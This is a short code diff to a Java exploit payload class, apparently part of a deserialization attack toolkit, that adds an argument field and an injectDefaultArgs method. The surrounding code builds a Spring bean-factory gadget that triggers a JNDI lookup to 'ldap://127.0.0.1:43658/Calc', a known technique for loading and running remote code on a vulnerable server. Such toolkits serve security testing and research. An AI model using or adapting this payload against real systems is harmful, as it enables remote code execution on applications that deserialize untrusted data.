@@ -19,6 +19,8 @@ import org.springframework.beans.factory.BeanFactory;
  */
 public class SpringAbstractBeanFactoryPointcutAdvisorPoc implements Payload {
 
+  private String[] args;
+
   /**
    *
    * @param args
@@ -29,6 +31,8 @@ public class SpringAbstractBeanFactoryPointcutAdvisorPoc implements Payload {
    */
   @Override
   public Object getPayload(String[] args) {
+    if (this.args != null)
+      args = this.args;
     Object o = null;
     try {
       BeanFactory bf = SpringUtil.makeJNDITrigger("ldap://127.0.0.1:43658/Calc");
@@ -38,4 +42,10 @@ public class SpringAbstractBeanFactoryPointcutAdvisorPoc implements Payload {
     }
     return o;
   }
+
+  @Override
+  public void injectDefaultArgs(String[] args) {
+    this.args = args;
+  }
+
 }
